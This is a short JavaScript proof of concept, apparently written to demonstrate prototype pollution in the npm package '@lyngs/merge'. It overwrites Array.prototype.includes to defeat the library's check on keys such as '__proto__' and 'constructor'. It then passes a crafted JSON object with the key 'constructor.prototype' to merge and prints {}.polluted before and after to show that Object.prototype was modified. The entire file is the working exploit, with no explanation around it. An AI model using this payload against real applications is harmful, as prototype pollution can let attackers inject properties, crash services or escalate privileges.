Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const {merge} = require('@lyngs/merge');
console.log({}.polluted);
merge({ dummy: 1 }, JSON.parse(`{"constructor.prototype": {"polluted":"yes"}}`));
console.log({}.polluted);